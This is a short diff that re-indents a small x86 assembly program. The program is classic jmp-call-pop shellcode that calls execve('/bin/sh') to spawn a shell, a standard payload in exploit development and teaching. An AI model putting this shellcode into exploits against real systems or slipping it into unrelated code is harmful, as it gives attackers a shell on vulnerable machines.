@@ -17,16 +17,16 @@ section	.text
 global	_start
 
 _start:
-	jmp short two
+    jmp short two
 
 one:
     ; execve("/bin/sh", [], NULL)
-	pop ebx
-	mov al, 0x0b
-	xor ecx, ecx
-	xor edx, edx
-	int 0x80
+    pop ebx
+    mov al, 0x0b
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
 
 two:
-	call one
-	db "/bin/sh"
+    call one
+    db "/bin/sh"
